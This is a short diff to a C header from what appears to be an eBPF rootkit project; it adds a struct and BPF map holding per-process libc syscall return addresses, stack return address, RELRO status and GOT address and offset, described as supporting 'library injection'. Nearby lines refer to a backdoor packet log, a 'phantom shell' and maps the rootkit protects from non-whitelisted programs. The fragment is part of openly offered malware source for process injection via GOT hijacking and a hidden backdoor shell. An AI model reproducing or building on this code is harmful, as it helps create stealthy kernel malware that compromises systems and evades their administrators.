@@ -49,6 +49,14 @@ struct backdoor_packet_log_data_16{
 //Map value, contains data of phantom shell, if active
 //In struct_common.h, it is used from userspace and kernel many times, so moved there
 
+struct inj_ret_address_data{ //Map value
+	__u64 libc_syscall_address;
+	__u64 stack_ret_address;
+	__u64 relro_active;
+	__u64 got_address;
+	__s32 got_offset;
+	__s32 padding;
+};
 
 struct fs_priv_open{ //Map
 	__uint(type, BPF_MAP_TYPE_HASH);
@@ -87,6 +95,15 @@ struct backdoor_priv_phantom_shell{
 	__type(value, struct backdoor_phantom_shell_data);
 	__uint(pinning, LIBBPF_PIN_BY_NAME);
 } backdoor_phantom_shell SEC(".maps");
+
+
+//Return addresses of syscalls in the shared library, for the library injection
+struct inj_priv_ret_address{ //Map
+	__uint(type, BPF_MAP_TYPE_HASH);
+	__uint(max_entries, 4096);
+	__type(key, __u64); //thread group id(MSB) + pid (LSB)
+	__type(value, struct inj_ret_address_data);
+} inj_ret_address SEC(".maps");
 
 /*PROTECTED MAPS*/
 //Any attempt to access these maps will be blocked by the rootkit if the program is not whitelisted
